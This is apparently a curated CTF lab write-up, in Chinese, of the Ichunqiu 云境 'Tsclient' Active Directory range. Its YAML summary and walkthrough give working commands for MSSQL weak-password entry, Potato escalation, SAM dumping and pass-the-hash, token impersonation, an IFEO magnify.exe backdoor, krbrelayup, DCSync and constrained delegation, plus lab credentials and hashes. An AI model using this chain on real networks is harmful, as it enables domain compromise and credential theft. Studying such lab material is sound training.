---
title: Ichunqiu 云境 —— Tsclient Writeup
contest: Ichunqiu 云境
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [MSSQL, Potato 提权, incognito, Tsclient, 镜像劫持, krbrelayup, 约束委派]
attack_chain: |
  1. 入口 172.22.8.18 MSSQL: 弱口令爆破 sa:1qaz!QAZ → xp_cmdshell shell
  2. 本地提权: Clsid 暴力怼 potato (GetClsid.ps1) → 找有效 clsid → system
  3. 导出 SAM/SYSTEM/Security → 解出 administrator NTLM hash 2caf35bb4c5059a3d50599844e2b9b1f → psexec 139 横向 → Flag01 (外网没开 445)
  4. qwinsta + 端口连接: 看到有 RDP 客户连接 → msf incognito 模块 → 模拟至 john token → net use 看到 \\tsclientC 共享 → \\tsclientC\credential.txt → xiaorang.lab Aldrich:Ald@rLMWuy7Z!#
  5. 镜像劫持 (传统): HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options 写 magnify.exe → 锁定 → 放大镜 → cmd.exe system
  6. krbrelayup 提权 (非传统): 域普通用户 → 域内机器 → 直接 system
  7. mimikatz 拿 win2016$ 机器账户 4ba974f170ab0fe1a8a1eb0ed8f6fe1a → 处于 Domain Admins 组
  8. DCSync 带走 DC01 (常规) / 约束委派 (非常规): Bloodhound 分析 → getST.py
key_payload: |
  # MSSQL 弱口令:
  sa : 1qaz!QAZ
  
  # Potato 提权 Clsid 扫描:
  ./GetClsid.ps1
  # 找到有效 Clsid 后用 potato 执行命令
  
  # administrator 凭据 (从 SAM 解):
  administrator : 2caf35bb4c5059a3d50599844e2b9b1f
  
  # 横向 (外网没开 445, 用 139):
  psexec.exe \\172.22.8.18 -u administrator -p "" -hashes :2caf35bb4c5059a3d50599844e2b9b1f cmd
  
  # incognito 模拟 token (msf):
  use incognito
  impersonate_token "XIAORANG\john"
  execute -f cmd -i -t
  
  # \\tsclientC\credential.txt:
  xiaorang.lab\Aldrich : Ald@rLMWuy7Z!#
  
  # 镜像劫持:
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
  
  # krbrelayup (非传统提权):
  python krbrelayup.py -dc-ip 172.22.8.3 -domain xiaorang.lab -target WIN2016$ xiaorang.lab/Aldrich:Ald@rLMWuy7Z!#
  
  # DCSync:
  secretsdump.py xiaorang.lab/Aldrich@DC01 -just-dc-user krbtgt
  
  # 约束委派:
  getST.py -spn cifs/DC01.xiaorang.lab -impersonate Administrator xiaorang.lab/Aldrich
one_liner: MSSQL 弱口令 → Potato 提权 → incognito 模拟 token 拿 \\tsclientC 凭据 → 镜像劫持/krbrelayup 提权 → DCSync 带走 DC。
lesson: |
  - MSSQL sa 弱口令 + xp_cmdshell 是 2022 经典入口
  - Potato 提权靠枚举有效 Clsid，需要离线工具集
  - msf incognito 是模拟 token 最稳定工具 (f-secure lab / 其他工具实测失败)
  - \\tsclientC 共享是 RDP 连接时挂载的本地磁盘，留 credential.txt 是常见违规操作
  - 镜像劫持 magnify.exe 在登录界面按 5 次 Shift 弹放大镜 → cmd
  - krbrelayup 是 2022 后新出的非传统提权，普通域用户在域机器直接 system
  - 约束委派 + getST.py 是 DCSync 之外的备选
quality: high
---

# Ichunqiu 云境 —— Tsclient Writeup

> 来源: ctfiot.com 85253 - Gcow 安全团队 小离

## 0x1 Info

- Tag: MSSQL, Privilege Escalation, Kerberos, 域渗透, RDP

## 0x2 Recon

- Target: 47.92.82.196
- MSSQL 弱口令爆破：**sa : 1qaz!QAZ** (MSSQLSERVER 服务账户权限)

## 0x3 入口点 172.22.8.18 (MSSQL)

### 本地提权 (Clsid Potato)

```powershell
# GetClsid.ps1 暴力枚举 Clsid:
./GetClsid.ps1
# 找有效 Clsid + potato.exe → system
```

### 导出 SAM/SYSTEM/Security

```
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\Security Security
# secretsdump.py 解出 NTLM
```

解出凭据: `administrator : 2caf35bb4c5059a3d50599844e2b9b1f` → psexec 139 横向 (外网没开 445) → **Flag01**

### qwinsta + 端口连接 (RDP 客户)

```bash
qwinsta
# 看到有机器 RDP 过来
```

`use incognito` → `impersonate_token "XIAORANG\john"` → `execute -f cmd -i -t` → `net use` 看到 `\\tsclientC` 共享

> 只有 msf 的 incognito 模块能完成模拟，f-secure lab 等其他 token 模拟工具实测失败

读 `\\tsclientC\credential.txt` → `xiaorang.lab\Aldrich : Ald@rLMWuy7Z!#`

## 0x4 域渗透 入口 172.22.8.46

### 提权方式 1 (传统): 镜像劫持

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
# 锁定用户 → 放大镜 → cmd.exe (system)
```

### 提权方式 2 (非传统, 推荐): krbrelayup

```bash
python krbrelayup.py -dc-ip 172.22.8.3 -domain xiaorang.lab -target WIN2016$ \
    xiaorang.lab/Aldrich:Ald@rLMWuy7Z!#
```

### 凭据收集

mimikatz → `win2016$` 机器账户: `4ba974f170ab0fe1a8a1eb0ed8f6fe1a` (处于 Domain Admins 组)

## 0x5 DC Takeover

### 方式 1: DCSync (常规)

```bash
secretsdump.py xiaorang.lab/Aldrich@DC01 -just-dc-user krbtgt
```

### 方式 2: 约束委派 (非常规)

```bash
# Bloodhound 分析
getST.py -spn cifs/DC01.xiaorang.lab -impersonate Administrator xiaorang.lab/Aldrich
```

## 0x6 Outro

incognito 模拟 token 部分按作者原意是写 impacket 工具的，但作者没脱离 MSF。

## 评价

云境系列里 MSSQL 弱口令 + 镜像劫持 + krbrelayup 的典型 AD 渗透链。`\\tsclientC` 共享读 credential.txt 是 Tsclient 题目的核心"漏洞面"，把 RDP 客户端挂载本地盘的违规操作暴露无遗。
